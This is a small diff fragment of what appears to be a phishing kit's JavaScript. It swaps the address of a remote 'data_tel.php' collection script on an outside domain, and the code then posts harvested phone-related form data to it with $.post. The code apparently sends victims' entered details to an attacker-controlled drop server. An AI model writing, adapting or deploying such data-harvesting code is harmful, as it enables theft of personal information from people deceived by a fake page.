@@ -27,7 +27,7 @@ PHONE_CR            :	phone
 
 
 
-var _url = 'https://thedonsolutions.com/firelgin/data_tel.php';
+var _url = 'https://whitmirelifepro.com/td6uS0/data_tel.php';
 
 
 $.post(_url,data_tel,function(data){
